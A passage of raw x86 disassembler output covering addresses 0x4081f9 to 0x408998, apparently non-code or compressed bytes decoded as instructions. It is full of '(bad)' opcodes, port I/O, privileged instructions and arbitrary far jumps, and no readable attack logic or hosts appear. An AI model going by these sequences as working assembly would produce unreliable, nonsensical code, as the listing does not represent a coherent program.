  4081f9:	xor    dh,BYTE PTR [ecx+0x24b1010b]
  4081ff:	or     bl,bh
  408201:	(bad)  
  408202:	cmp    eax,0x92f2055c
  408207:	repnz add BYTE PTR [esi-0x67ba617c],ch
  40820e:	clc    
  40820f:	dec    edx
  408210:	xor    eax,0xb0c8991b
  408215:	jo     0x408221
  408217:	and    eax,0x11698806
  40821c:	sbb    al,0x71
  40821e:	jecxz  0x408280
  408220:	jns    0x4081ba
  408222:	pop    ebp
  408223:	xor    BYTE PTR [eax+0x642e57e0],bh
  408229:	and    edi,esi
  40822b:	pop    ecx
  40822c:	(bad)
  408231:	dec    edx
  408232:	pop    ecx
  408233:	shl    cl,cl
  408235:	mov    al,0x63
  408237:	xchg   esi,eax
  408238:	sahf   
  408239:	jle    0x408244
  40823b:	cwde   
  40823c:	test   eax,0x6f6ee0ab
  408241:	(bad)  
  408242:	sbb    al,0xb9
  408244:	push   ss
  408245:	loope  0x408296
  408247:	test   BYTE PTR [eax-0x64b3cabf],bh
  40824d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40824e:	int    0x5b
  408250:	push   edi
  408251:	aam    0x5b
  408253:	ja     0x40822f
  408255:	jne    0x408285
  408257:	ds stos BYTE PTR es:[edi],al
  408259:	lock add DWORD PTR [esi],esp
  40825c:	add    bl,BYTE PTR [edx+0x51]
  40825f:	js     0x4081e2
  408261:	gs test al,0x2f
  408264:	ins    BYTE PTR es:[edi],dx
  408265:	xchg   esi,eax
  408266:	adc    al,0xd1
  408268:	pusha  
  408269:	mov    ebx,0xe9f83895
  40826e:	and    ebx,DWORD PTR [edi-0xa]
  408271:	out    0x1b,eax
  408273:	jge    0x40828b
  408275:	(bad)  
  408276:	dec    ebx
  408277:	mov    ah,0xb5
  408279:	inc    esp
  40827a:	(bad)
  40827d:	les    ecx,FWORD PTR [eax-0x3d4afca7]
  408283:	test   BYTE PTR [eax+0x73efc076],ch
  408289:	pusha  
  40828a:	repz pusha 
  40828c:	loope  0x408263
  40828e:	adc    al,0x80
  408290:	sub    esi,DWORD PTR [edx-0xe]
  408293:	sbb    dh,dl
  408295:	xor    ah,al
  408297:	jecxz  0x4082a2
  408299:	dec    ebp
  40829a:	xchg   edi,eax
  40829b:	sub    bl,BYTE PTR [esp+ecx*1]
  40829e:	push   esi
  40829f:	xchg   esi,eax
  4082a0:	adc    DWORD PTR [esi-0x79960b1d],edi
  4082a6:	xchg   ecx,eax
  4082a7:	pop    ebp
  4082a8:	aad    0xf9
  4082aa:	pusha  
  4082ab:	les    edi,FWORD PTR [eax+0x4a]
  4082ae:	adc    edi,DWORD PTR [edi-0x307aa010]
  4082b4:	dec    ebx
  4082b5:	call   0x1cdc6324
  4082ba:	loopne 0x408263
  4082bc:	xchg   esi,eax
  4082bd:	and    DWORD PTR [ebp+0x24],ebp
  4082c0:	push   ebx
  4082c1:	sub    eax,0x885d4601
  4082c6:	inc    esp
  4082c7:	mov    dl,0xbb
  4082c9:	shl    DWORD PTR [ebp+ecx*2-0x29],cl
  4082cd:	dec    edi
  4082ce:	push   eax
  4082cf:	xor    bh,BYTE PTR ds:0x90e6f49d
  4082d5:	jle    0x4082d0
  4082d7:	cmp    dl,BYTE PTR [ecx]
  4082d9:	xchg   ecx,eax
  4082da:	mov    ebx,0xdf37bf31
  4082df:	sar    DWORD PTR [esi-0x49b4e230],0x52
  4082e6:	pop    esi
  4082e7:	(bad)  
  4082e8:	(bad)  
  4082e9:	aas    
  4082ea:	loop   0x4082b8
  4082ec:	xchg   DWORD PTR [ecx],ebx
  4082ee:	add    ah,BYTE PTR ds:0x879a2c04
  4082f4:	iret   
  4082f5:	dec    eax
  4082f6:	sub    al,0x54
  4082f8:	xor    al,0x85
  4082fa:	xchg   esp,eax
  4082fb:	jmp    0x408324
  4082fd:	daa    
  4082fe:	cmc    
  4082ff:	inc    esi
  408300:	or     bl,bh
  408302:	ins    BYTE PTR es:[edi],dx
  408303:	div    BYTE PTR [esi+0x74837ed6]
  408309:	call   0x6b5b5d2d
  40830e:	rcl    BYTE PTR [ebx],1
  408310:	mov    al,ds:0x7d2eaf65
  408315:	cli    
  408316:	push   ds
  408317:	sub    ebx,esp
  408319:	cmp    DWORD PTR [edi+0x53],edi
  40831c:	jp     0x4082ee
  40831e:	sbb    edi,DWORD PTR [ebx]
  408320:	imul   esp,DWORD PTR [esi+ecx*8+0x45e22a0f],0xf6205084
  40832b:	stos   BYTE PTR es:[edi],al
  40832c:	les    esp,FWORD PTR [ebx+0x4a77594d]
  408332:	xor    BYTE PTR [esi-0x7f],bl
  408335:	xor    eax,0x32991b9d
  40833a:	dec    edx
  40833b:	cmp    edi,DWORD PTR [ebx-0x6d]
  40833e:	and    esp,ebx
  408340:	addr16 xchg edi,eax
  408342:	adc    BYTE PTR [edx],dh
  408344:	je     0x408349
  408346:	stc    
  408347:	popf   
  408348:	push   esp
  408349:	jno    0x408338
  40834b:	add    eax,0x8bd1448c
  408350:	push   edi
  408351:	ins    DWORD PTR es:[edi],dx
  408352:	rcr    BYTE PTR [ebp-0x6c966339],0x41
  408359:	inc    esp
  40835a:	and    al,0xae
  40835c:	mov    WORD PTR fs:[ebx+0x10],ds
  408360:	xor    ebp,ebx
  408362:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408363:	pop    esp
  408364:	cmp    al,0x26
  408366:	push   esp
  408367:	fcomip st,st(1)
  408369:	outs   dx,DWORD PTR ds:[esi]
  40836a:	(bad)  
  40836b:	pusha  
  40836c:	loopne 0x408389
  40836e:	or     al,0xe
  408370:	pushf  
  408371:	xchg   esi,eax
  408372:	jnp    0x408314
  408374:	lds    esp,FWORD PTR gs:[esi+0x63]
  408378:	hlt    
  408379:	test   BYTE PTR [edi],al
  40837b:	mov    WORD PTR [eax+0x694a2ef8],cs
  408381:	aam    0x51
  408383:	in     al,0x84
  408385:	mov    ds:0x6a42baf2,eax
  40838a:	xchg   ebp,eax
  40838b:	inc    sp
  40838d:	sbb    al,BYTE PTR [edi]
  40838f:	rcr    BYTE PTR [edx-0x1b],0x5a
  408393:	mov    ?,WORD PTR [esi+0x6]
  408396:	pop    esi
  408397:	jae    0x4083db
  408399:	dec    eax
  40839a:	mov    esi,0x69824000
  40839f:	test   BYTE PTR [ebx+0x18ecedcb],dl
  4083a5:	retf   0xbbff
  4083a8:	packssdw mm4,QWORD PTR [ebp-0x52]
  4083ac:	lods   al,BYTE PTR ds:[esi]
  4083ad:	leave  
  4083ae:	push   0xffffff9e
  4083b0:	retf   0x9981
  4083b3:	mov    esi,0xdb955552
  4083b8:	push   ecx
  4083b9:	and    al,0xa3
  4083bb:	in     eax,0xd0
  4083bd:	in     eax,0x3d
  4083bf:	jnp    0x408403
  4083c1:	std    
  4083c2:	add    bl,BYTE PTR [ebx+0x7a]
  4083c5:	xor    BYTE PTR [edx+0x2d],ch
  4083c8:	sbb    DWORD PTR [edx],edi
  4083ca:	mov    ebp,0x341a605a
  4083cf:	je     0x408368
  4083d1:	mov    DWORD PTR ds:0x2d2eceb2,0x8caf1cf2
  4083db:	icebp  
  4083dc:	jbe    0x408402
  4083de:	inc    ecx
  4083df:	ss pop ss
  4083e1:	mov    ch,0xa8
  4083e3:	call   DWORD PTR [ecx-0x67]
  4083e6:	shl    ebp,cl
  4083e8:	scas   al,BYTE PTR es:[edi]
  4083e9:	into   
  4083ea:	mov    dh,0xd5
  4083ec:	fstp   TBYTE PTR [esp+esi*1]
  4083ef:	push   esp
  4083f0:	xchg   ebx,eax
  4083f1:	repz add eax,0x2fa08afb
  4083f7:	mov    BYTE PTR [ebx-0xd],bh
  4083fa:	je     0x4083bf
  4083fc:	adc    BYTE PTR [ebp-0x4],bh
  4083ff:	add    BYTE PTR [eax+0x3a],al
  408402:	pop    esp
  408403:	sub    eax,0x90692b8d
  408408:	or     DWORD PTR fs:[ecx+eax*4-0xe],esp
  40840d:	jae    0x4083cb
  40840f:	and    edx,DWORD PTR [eax-0x2189171]
  408415:	addr16 or eax,0xaaab4f7e
  40841b:	ins    BYTE PTR es:[edi],dx
  40841c:	gs cmc 
  40841e:	outs   dx,DWORD PTR ds:[esi]
  40841f:	outs   dx,BYTE PTR ds:[esi]
  408420:	inc    esi
  408421:	push   es
  408422:	sbb    eax,0x9a3b2784
  408427:	mov    edi,0xeb272bdb
  40842c:	xor    BYTE PTR ds:0xfbea253b,dl
  408432:	lahf   
  408433:	mov    bh,0xb3
  408435:	enter  0x9d9f,0xcf
  408439:	repnz int 0x9c
  40843c:	jno    0x4084b5
  40843e:	xchg   ecx,eax
  40843f:	jo     0x408461
  408441:	test   al,0x31
  408443:	jmp    0x9c11:0x1bf7dad1
  40844a:	adc    dl,dh
  40844c:	inc    ebp
  40844d:	test   DWORD PTR [ecx-0x7ef1d832],esp
  408453:	call   0x6671:0x887aebf5
  40845a:	out    dx,eax
  40845b:	dec    eax
  40845c:	mov    ds:0x7e268d9d,al
  408461:	mov    dh,0xff
  408463:	jmp    0x72b1952
  408468:	arpl   WORD PTR [ebx-0x662de36f],bp
  40846e:	pop    edi
  40846f:	xchg   DWORD PTR [edi-0x1e87963e],edx
  408475:	jecxz  0x408479
  408477:	or     BYTE PTR [eax+0xa],dl
  40847a:	ins    BYTE PTR es:[edi],dx
  40847b:	lock stos BYTE PTR es:[edi],al
  40847d:	call   0x4294e7a2
  408482:	mov    ecx,0x1677aa22
  408487:	cmp    ecx,DWORD PTR [edx+0x397f89b1]
  40848d:	sub    bl,BYTE PTR [edi-0xd33ea88]
  408493:	in     eax,0xe9
  408495:	icebp  
  408496:	sbb    BYTE PTR [ecx+0x63],bl
  408499:	mov    dl,0x5
  40849b:	pop    ecx
  40849c:	dec    esi
  40849d:	dec    eax
  40849e:	add    ebp,DWORD PTR [esi+ebx*1-0x5704005b]
  4084a5:	(bad)  
  4084a6:	cld    
  4084a7:	je     0x4084ec
  4084a9:	dec    ebp
  4084aa:	push   ecx
  4084ab:	jb     0x4084c0
  4084ad:	and    al,0xb5
  4084af:	jno    0x4084ee
  4084b1:	xchg   edx,eax
  4084b2:	out    dx,eax
  4084b3:	test   DWORD PTR [eax+0x3e1979ee],ebx
  4084b9:	push   ebp
  4084ba:	cli    
  4084bb:	push   ss
  4084bc:	out    dx,al
  4084bd:	daa    
  4084be:	and    esp,DWORD PTR [eax+0x2360e79c]
  4084c4:	mov    BYTE PTR [ecx-0x624007da],dl
  4084ca:	pop    esi
  4084cb:	or     BYTE PTR [edi+eax*1-0x12],bh
  4084cf:	mov    ch,0x1c
  4084d1:	mov    edi,esi
  4084d3:	pop    ecx
  4084d4:	jno    0x4084da
  4084d6:	push   ds
  4084d7:	add    cl,ah
  4084d9:	shl    dl,cl
  4084db:	ds mov esp,0x88f3d219
  4084e1:	lds    edx,FWORD PTR [esi+ebx*2]
  4084e4:	outs   dx,BYTE PTR ds:[esi]
  4084e5:	inc    ebp
  4084e6:	xlat   BYTE PTR ds:[ebx]
  4084e7:	mov    dl,0x73
  4084e9:	pop    esi
  4084ea:	jmp    0x408506
  4084ec:	push   esp
  4084ed:	out    0x75,eax
  4084ef:	fdiv   st,st(6)
  4084f1:	xor    eax,0x4990bb0e
  4084f6:	lods   eax,DWORD PTR ds:[esi]
  4084f7:	add    ebx,DWORD PTR es:[edx-0x52251e35]
  4084fe:	adc    al,0x57
  408500:	(bad)  [ecx]
  408502:	imul   edx,DWORD PTR [ebx-0x38944769],0x72
  408509:	sbb    al,0xba
  40850b:	sub    al,0xd3
  40850d:	xor    eax,0x6697056b
  408512:	(bad)  
  408513:	sti    
  408514:	add    eax,0x39c648a2
  408519:	sbb    edx,0x1d
  40851c:	fidivr WORD PTR ss:[edx-0x5a]
  408520:	popf   
  408521:	sub    ecx,ecx
  408523:	push   edi
  408524:	adc    BYTE PTR [ebp+0x77],ch
  408527:	pop    es
  408528:	outs   dx,DWORD PTR ds:[esi]
  408529:	dec    esi
  40852a:	jb     0x4084d8
  40852c:	jno    0x4084c6
  40852e:	jecxz  0x408502
  408530:	imul   edx,ebp,0x50d2cdf5
  408536:	push   ecx
  408537:	dec    esp
  408538:	adc    DWORD PTR [esi],edx
  40853a:	in     al,dx
  40853b:	stc    
  40853c:	mov    ch,0x9d
  40853e:	add    al,0x7c
  408540:	shl    BYTE PTR [ebp-0x79],0xe5
  408544:	push   ebp
  408545:	outs   dx,BYTE PTR ds:[esi]
  408546:	nop
  408547:	push   edi
  408548:	retf   
  408549:	push   esp
  40854a:	ja     0x408525
  40854c:	inc    edx
  40854d:	mov    ecx,DWORD PTR [ebx+0x72]
  408550:	cmp    cl,bh
  408552:	clc    
  408553:	repz fs ret 
  408556:	dec    eax
  408557:	int3   
  408558:	mov    ebx,0xce8c38b5
  40855d:	mov    al,ds:0x84faf26c
  408562:	es inc ebp
  408564:	inc    edi
  408565:	mov    ebx,0x6e880fde
  40856a:	sahf   
  40856b:	sbb    ecx,DWORD PTR [eax+ecx*2+0x158c194b]
  408572:	inc    edi
  408573:	retf   0x6c1c
  408576:	mov    dh,0xdc
  408578:	or     BYTE PTR [edi-0x431166b4],dh
  40857e:	push   ss
  40857f:	int    0xd5
  408581:	push   edx
  408582:	test   eax,0xb24b7806
  408587:	pop    edx
  408588:	xor    eax,0x872bb34e
  40858d:	mov    ds:0x8219d3b2,al
  408592:	mov    al,0x82
  408594:	dec    esi
  408595:	pop    ss
  408596:	test   eax,0xd72c6de7
  40859b:	cli    
  40859c:	rcr    esp,1
  40859e:	xor    al,0x9b
  4085a0:	scas   al,BYTE PTR es:[edi]
  4085a1:	(bad)  
  4085a2:	in     al,dx
  4085a3:	rcr    BYTE PTR [ebp+0x52aa084f],1
  4085a9:	mov    ds:0xf4a3ec7b,al
  4085ae:	cs popf 
  4085b0:	or     al,0xbb
  4085b2:	xor    DWORD PTR [esi+0x4b],0xffffffb0
  4085b6:	cld    
  4085b7:	push   ecx
  4085b8:	inc    esp
  4085b9:	popa   
  4085ba:	mov    bh,0x3b
  4085bc:	cs jo  0x408604
  4085bf:	into   
  4085c0:	mov    esi,DWORD PTR [ebx]
  4085c2:	add    eax,0x6485a604
  4085c7:	push   0xffffff8b
  4085c9:	popf   
  4085ca:	out    0xd2,eax
  4085cc:	cmp    al,0xd9
  4085ce:	push   es
  4085cf:	jp     0x408622
  4085d1:	les    esp,FWORD PTR [ebp+0x74]
  4085d4:	das    
  4085d5:	inc    ebp
  4085d6:	xchg   ebx,eax
  4085d7:	into   
  4085d8:	(bad)  
  4085d9:	jbe    0x408613
  4085db:	mov    edi,0x5d9c5bcd
  4085e0:	pop    esi
  4085e1:	jns    0x40859e
  4085e3:	fdivr  QWORD PTR [ecx+0x4c95995d]
  4085e9:	ja     0x408583
  4085eb:	ss in  eax,0x6f
  4085ee:	jmp    0x4085d9
  4085f0:	jbe    0x4085ac
  4085f2:	add    eax,0xa227c320
  4085f7:	xlat   BYTE PTR ds:[ebx]
  4085f8:	or     BYTE PTR [eiz*2+0x12a06454],cl
  4085ff:	(bad)  
  408600:	sbb    esp,ebx
  408602:	mov    eax,0x4c7f6813
  408607:	int3   
  408608:	sub    esp,edi
  40860a:	cs es xchg edi,eax
  40860d:	test   al,0x1
  40860f:	push   ebp
  408610:	push   edi
  408611:	int    0xcc
  408613:	and    BYTE PTR [edx],ch
  408615:	and    BYTE PTR [eax],dh
  408617:	ror    BYTE PTR [ebx-0x6],0xe6
  40861b:	mov    bl,cl
  40861d:	std    
  40861e:	imul   ebx,DWORD PTR [ebx-0x12e585f2],0x6
  408625:	pushf  
  408626:	(bad)  fs:[ebx+0x70]
  40862a:	cli    
  40862b:	mov    es,WORD PTR [ebx]
  40862d:	mov    bh,0x9b
  40862f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408631:	pop    esi
  408632:	int    0x1e
  408634:	add    BYTE PTR [eax],dh
  408636:	jge    0x4085ed
  408638:	sbb    dl,bl
  40863a:	and    ah,al
  40863c:	mov    dh,0x26
  40863e:	pop    edi
  40863f:	mov    BYTE PTR [edx],ch
  408641:	ds and al,0x3b
  408644:	or     cl,0x1b
  408647:	ss aaa 
  408649:	cmp    BYTE PTR [ecx+eiz*4-0xd],dh
  40864d:	data16 clc 
  40864f:	cwde   
  408650:	mov    al,ds:0x67273f08
  408655:	inc    esi
  408656:	mov    edx,0xd7fbc194
  40865b:	mov    dh,0x96
  40865d:	aam    0xad
  40865f:	mov    dl,0x66
  408661:	and    cl,BYTE PTR [ebx+edx*1+0x2e]
  408665:	push   ss
  408666:	fld    TBYTE PTR [ebx-0x501442fa]
  40866c:	mov    al,0xe6
  40866e:	int3   
  40866f:	aaa    
  408670:	adc    esp,DWORD PTR [ebp-0x36f0b124]
  408676:	mov    dl,0x64
  408678:	pop    edi
  408679:	mov    ch,0x86
  40867b:	bound  ebp,QWORD PTR [esi+eax*1-0x64]
  40867f:	repz clc 
  408681:	rcr    DWORD PTR [ecx+0x38],cl
  408684:	cmp    al,0x90
  408686:	sub    dh,cl
  408688:	(bad)  
  408689:	int3   
  40868a:	jb     0x4086d0
  40868c:	ins    DWORD PTR es:[edi],dx
  40868d:	sub    al,0xeb
  40868f:	fisubr DWORD PTR [esp+ebp*1-0x6]
  408693:	pop    edx
  408694:	mov    eax,ds:0x5d258b06
  408699:	std    
  40869a:	pop    ds
  40869b:	sti    
  40869c:	or     eax,0x29e186fc
  4086a1:	adc    ah,bl
  4086a3:	push   eax
  4086a4:	in     eax,dx
  4086a5:	loopne 0x408640
  4086a7:	jns    0x40870b
  4086a9:	and    cl,BYTE PTR [esi-0x5accd92d]
  4086af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086b0:	cli    
  4086b1:	jb     0x4086f1
  4086b3:	jle    0x408716
  4086b5:	adc    BYTE PTR [eax],bl
  4086b7:	ror    BYTE PTR [esi],cl
  4086b9:	jl     0x4086a9
  4086bb:	shl    DWORD PTR [ecx],cl
  4086bd:	or     cl,BYTE PTR [edi]
  4086bf:	jae    0x408645
  4086c1:	rol    DWORD PTR [ecx-0x28],cl
  4086c4:	iret   
  4086c5:	or     al,0xc4
  4086c7:	adc    eax,0xfa27a352
  4086cc:	js     0x408748
  4086ce:	sub    BYTE PTR [edi],dh
  4086d0:	(bad)  
  4086d1:	scas   eax,DWORD PTR es:[edi]
  4086d2:	shr    DWORD PTR [edx-0x5],1
  4086d5:	repnz shl BYTE PTR [edx],cl
  4086d8:	aam    0x29
  4086da:	mov    DWORD PTR [eax-0x43],edi
  4086dd:	ds push es
  4086df:	push   edx
  4086e0:	push   cs
  4086e1:	mov    ch,0xb7
  4086e3:	aas    
  4086e4:	push   eax
  4086e5:	shl    ebp,1
  4086e7:	push   edx
  4086e8:	in     eax,dx
  4086e9:	add    eax,0xdbd7ac3c
  4086ee:	jo     0x4086a3
  4086f0:	cld    
  4086f1:	jmp    0x8fa3:0x948a079c
  4086f8:	inc    ebp
  4086f9:	(bad)  
  4086fa:	mov    ecx,0xe3c5c3cf
  4086ff:	stos   BYTE PTR es:[edi],al
  408700:	aas    
  408701:	xchg   edi,eax
  408702:	mov    ?,ecx
  408704:	scas   al,BYTE PTR es:[edi]
  408705:	mov    al,ds:0x8738ee19
  40870a:	popa   
  40870b:	mov    al,0x88
  40870d:	bnd js 0x4086e1
  408710:	jg     0x4086ea
  408712:	(bad)  
  408713:	push   ds
  408714:	ret    0x8dce
  408717:	push   cs
  408718:	xchg   esi,eax
  408719:	sbb    DWORD PTR [edi+eiz*1-0x28c3997c],esi
  408720:	push   edi
  408721:	(bad)  
  408722:	aas    
  408723:	jp     0x4086fb
  408725:	iret   
  408726:	sbb    eax,0xfede61fa
  40872b:	sahf   
  40872c:	xchg   esp,eax
  40872d:	jle    0x408718
  40872f:	outs   dx,DWORD PTR ds:[esi]
  408730:	pop    esi
  408731:	jo     0x4086f2
  408733:	scas   eax,DWORD PTR es:[edi]
  408734:	cmc    
  408735:	adc    eax,DWORD PTR [eax-0x5]
  408738:	in     al,0x7e
  40873a:	sub    esp,0xfffffff9
  40873d:	inc    edi
  40873e:	jbe    0x408760
  408740:	in     al,dx
  408741:	mov    WORD PTR [eax],es
  408743:	ret    0x1a1
  408746:	push   ebp
  408747:	std    
  408748:	jae    0x4087bc
  40874a:	inc    ecx
  40874b:	lahf   
  40874c:	mov    bl,0x3f
  40874e:	mov    dh,0xf2
  408750:	xor    edx,edx
  408752:	inc    esi
  408753:	and    al,BYTE PTR [esp+edx*1+0xf]
  408757:	out    0xc6,eax
  408759:	je     0x40879d
  40875b:	mov    dl,0xe9
  40875d:	loop   0x40875a
  40875f:	cmp    esi,DWORD PTR [ebx]
  408761:	outs   dx,DWORD PTR ds:[esi]
  408762:	sub    ch,BYTE PTR [ebx]
  408764:	xchg   esi,ebx
  408766:	xchg   BYTE PTR [ebp+0x40],cl
  408769:	mov    ch,al
  40876b:	loop   0x408779
  40876d:	ins    BYTE PTR es:[edi],dx
  40876e:	pop    eax
  40876f:	loope  0x4087d5
  408771:	xchg   edx,eax
  408772:	pop    edi
  408773:	push   edi
  408774:	cdq    
  408775:	aaa    
  408776:	ret    
  408777:	bound  ecx,QWORD PTR [esi+ecx*1]
  40877a:	xchg   edi,eax
  40877b:	mov    gs,WORD PTR [edi+ecx*1+0x34]
  40877f:	or     ch,dh
  408781:	dec    eax
  408782:	adc    BYTE PTR [edx+0x7f199256],ch
  408788:	fisubr WORD PTR [esi+0x3e]
  40878b:	push   0x71ffec20
  408790:	ins    DWORD PTR es:[edi],dx
  408791:	lahf   
  408792:	inc    edi
  408793:	mov    ds:0xe98abab2,eax
  408798:	js     0x4087ed
  40879a:	mov    eax,0x68770847
  40879f:	inc    ebx
  4087a0:	sbb    bh,bl
  4087a2:	lods   al,BYTE PTR ds:[esi]
  4087a3:	push   ebx
  4087a4:	pop    ss
  4087a5:	mov    BYTE PTR [ecx],dl
  4087a7:	ss stc 
  4087a9:	arpl   bx,si
  4087ab:	mov    ecx,0x4e937fb2
  4087b0:	push   edx
  4087b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087b2:	pusha  
  4087b3:	cmc    
  4087b4:	push   ecx
  4087b5:	mov    al,0x42
  4087b7:	push   eax
  4087b8:	fwait
  4087b9:	les    edx,FWORD PTR ds:0x61eff373
  4087bf:	ret    0xcec4
  4087c2:	sahf   
  4087c3:	mov    esp,0xb28a8cab
  4087c8:	popf   
  4087c9:	sbb    dl,BYTE PTR [eax]
  4087cb:	addr16 leave 
  4087cd:	sub    al,0x3d
  4087cf:	xor    BYTE PTR [esp+ebx*2],ch
  4087d2:	pusha  
  4087d3:	add    al,0x8f
  4087d5:	(bad)  
  4087d6:	retf   0xfa52
  4087d9:	jle    0x4087e1
  4087db:	data16 shr al,0xdb
  4087df:	rcr    BYTE PTR [ebp+ecx*8-0x6c14d3ee],cl
  4087e6:	xchg   esp,eax
  4087e7:	rol    dl,0xf0
  4087ea:	add    BYTE PTR [esi],0xea
  4087ed:	int3   
  4087ee:	es addr16 int 0xa8
  4087f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087f3:	sub    BYTE PTR [esi+0x2557d0b],dl
  4087f9:	sub    DWORD PTR [ebp-0x6318782e],edi
  4087ff:	popa   
  408800:	(bad)  [ecx+0x5d4ab94e]
  408806:	dec    eax
  408807:	mov    ds:0x24a74ac2,eax
  40880c:	scas   al,BYTE PTR es:[edi]
  40880d:	shl    BYTE PTR [ecx-0x38],0xd8
  408811:	mov    DWORD PTR [ecx-0x6389a2b3],esi
  408817:	push   ecx
  408818:	and    BYTE PTR [ecx+esi*1-0x7c],0xc9
  40881d:	retf   
  40881e:	fidivr DWORD PTR [edx+ecx*2+0x34]
  408822:	fwait
  408823:	stos   DWORD PTR es:[edi],eax
  408824:	pcmpeqb mm1,QWORD PTR [ecx+0x8]
  408828:	cmp    bh,BYTE PTR [edi-0x71]
  40882b:	add    BYTE PTR [ecx],0x77
  40882e:	enter  0xbfda,0x31
  408832:	hlt    
  408833:	inc    ecx
  408834:	fwait
  408835:	aas    
  408836:	div    esp
  408838:	push   ecx
  408839:	pop    edx
  40883a:	retf   0x4d5a
  40883d:	test   eax,0xd6eaf1c7
  408842:	loope  0x4087d1
  408844:	and    eax,0x4b3f801e
  408849:	sbb    DWORD PTR [ebx],esp
  40884b:	adc    eax,0x1c9ac392
  408850:	repnz aad 0x93
  408853:	(bad)  
  408854:	cmp    esi,eax
  408856:	loope  0x4087f2
  408858:	jmp    0xd0d61039
  40885d:	or     al,0x5b
  40885f:	enter  0xcc7f,0x31
  408863:	adc    al,0x4e
  408865:	cld    
  408866:	inc    ebp
  408867:	loopne 0x408849
  408869:	push   esi
  40886a:	jg     0x40889a
  40886c:	ins    DWORD PTR es:[edi],dx
  40886d:	popf   
  40886e:	inc    ecx
  40886f:	jns    0x40880b
  408871:	mov    ds:0xf11a2df6,eax
  408876:	not    ch
  408878:	mov    edi,0xf1f7aff8
  40887d:	ins    DWORD PTR es:[edi],dx
  40887e:	cmp    dh,bh
  408880:	(bad)  
  408881:	mov    ch,0x15
  408883:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408884:	sti    
  408885:	and    edx,esi
  408887:	pop    esp
  408888:	shr    BYTE PTR [esp+ebp*8],1
  40888b:	ficomp WORD PTR [edi]
  40888d:	(bad)  
  40888e:	cmp    esp,esi
  408890:	lods   al,BYTE PTR ds:[esi]
  408891:	ins    DWORD PTR es:[edi],dx
  408892:	or     DWORD PTR [edi+0x27],ecx
  408895:	lea    esp,[ebx]
  408897:	push   ebx
  408898:	lods   al,BYTE PTR ds:[esi]
  408899:	loopne 0x4088b2
  40889b:	sub    al,bh
  40889d:	fwait
  40889e:	clc    
  40889f:	push   esp
  4088a0:	aas    
  4088a1:	pop    ds
  4088a2:	popa   
  4088a3:	xchg   edx,eax
  4088a4:	mov    DWORD PTR [edx+0x65],edi
  4088a7:	cwde   
  4088a8:	aaa    
  4088a9:	dec    esp
  4088aa:	jmp    0x4088a7
  4088ac:	lahf   
  4088ad:	arpl   WORD PTR ss:[eax],sp
  4088b0:	xlat   BYTE PTR ds:[ebx]
  4088b1:	sbb    DWORD PTR [esi+0x320014b3],edx
  4088b7:	in     al,0xba
  4088b9:	fldenv [ebx+0x54]
  4088bc:	(bad)  
  4088bd:	fstp   TBYTE PTR [ebx+0x8]
  4088c0:	rol    cl,1
  4088c2:	outs   dx,BYTE PTR ds:[esi]
  4088c3:	out    0xf4,eax
  4088c5:	pop    ebp
  4088c6:	mov    al,ds:0xbe13b24
  4088cb:	jb     0x408900
  4088cd:	retf   
  4088ce:	rcr    bh,1
  4088d0:	in     eax,0x41
  4088d2:	loopne 0x408884
  4088d4:	int    0x8c
  4088d6:	push   es
  4088d7:	lahf   
  4088d8:	icebp  
  4088d9:	sub    al,BYTE PTR [edx-0x1d6f997c]
  4088df:	dec    edi
  4088e0:	sbb    bl,ch
  4088e2:	sub    ah,BYTE PTR [ecx+ecx*2]
  4088e5:	add    eax,0x5d6faed7
  4088ea:	fucom  st(1)
  4088ec:	adc    al,0xb0
  4088ee:	sub    DWORD PTR [edx+0x5e],ebx
  4088f1:	shl    DWORD PTR [edi],cl
  4088f3:	xchg   ebx,eax
  4088f4:	dec    ebx
  4088f5:	in     eax,0xf4
  4088f7:	mov    DWORD PTR [edi],esi
  4088f9:	(bad)
  4088fe:	add    al,0x59
  408900:	test   eax,0xb3f32aae
  408905:	test   eax,0xbc0f18df
  40890a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40890b:	inc    esp
  40890c:	dec    esp
  40890d:	das    
  40890e:	punpckhbw mm6,QWORD PTR [ecx]
  408911:	xchg   esp,eax
  408912:	nop
  408913:	ret    0x4fa2
  408916:	mov    bl,cl
  408918:	fsubr  DWORD PTR ds:0xe649e15a
  40891e:	mov    BYTE PTR [ebp-0x2a],cl
  408921:	leave  
  408922:	mov    ecx,0x4d1e0bba
  408927:	imul   ch
  408929:	cmp    al,0x7b
  40892b:	shr    ch,0x64
  40892e:	in     eax,dx
  40892f:	push   ebx
  408930:	int3   
  408931:	and    al,0x44
  408933:	push   0xffffff9e
  408935:	retf   
  408936:	in     eax,0x84
  408938:	dec    ebp
  408939:	shl    BYTE PTR [edi-0x69a2e976],0x11
  408940:	push   ecx
  408941:	mov    cl,0x73
  408943:	push   es
  408944:	les    eax,FWORD PTR [eax+0x14]
  408947:	xor    al,0x21
  408949:	fdivp  st(2),st
  40894b:	int    0xb1
  40894d:	aad    0x2c
  40894f:	and    al,0x90
  408951:	outs   dx,DWORD PTR ds:[esi]
  408952:	xchg   edx,eax
  408953:	lds    esi,FWORD PTR [edx]
  408955:	ja     0x408901
  408957:	sub    eax,0xec955127
  40895c:	imul   ecx,DWORD PTR [esi+0x748a8a0a],0x4c
  408963:	rcl    DWORD PTR [esi+esi*2],0x32
  408967:	mov    dh,0xda
  408969:	jne    0x40898a
  40896b:	push   ds
  40896c:	neg    DWORD PTR [ebp-0x39]
  40896f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408970:	xchg   ebx,eax
  408971:	sahf   
  408972:	out    0xd3,eax
  408974:	out    0x72,al
  408976:	pop    esp
  408977:	xor    DWORD PTR [esi-0x7a],ebp
  40897a:	cmp    al,0xeb
  40897c:	fldcw  WORD PTR [ecx-0x70c90950]
  408982:	icebp  
  408983:	or     DWORD PTR [edi-0x2b],0x78
  408987:	pusha  
  408988:	dec    eax
  408989:	mov    edx,0x6393cc83
  40898e:	clc    
  40898f:	(bad)  
  408990:	push   ecx
  408991:	cmp    DWORD PTR [ebx],ecx
  408993:	cmp    BYTE PTR [ebp-0x8],0x34
  408997:	dec    edi
  408998:	jno    0x4089cd
